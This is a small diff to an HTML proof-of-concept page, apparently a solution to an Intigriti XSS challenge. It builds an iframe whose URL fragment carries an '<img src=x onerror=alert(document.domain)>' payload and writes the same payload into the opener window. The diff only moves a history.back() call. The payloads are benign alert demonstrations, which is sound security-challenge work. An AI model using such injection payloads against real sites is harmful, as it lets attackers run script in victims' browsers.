@@ -2,7 +2,6 @@
 
 <body>
   <script>
-    window.history.back();
     var iframe = document.createElement('iframe');
     iframe.name = 'helloworld';
     iframe.src = 'https://challenge.intigriti.io/static/4/challenge1.png\#<img src=x onerror=alert(document.domain)>'
@@ -12,6 +11,7 @@
         myWindow.opener.document.write('<img src=x onerror=alert(document.domain)>')
     }
     document.body.appendChild(iframe);
+    window.history.back();
     alert();
   </script>
 </body>
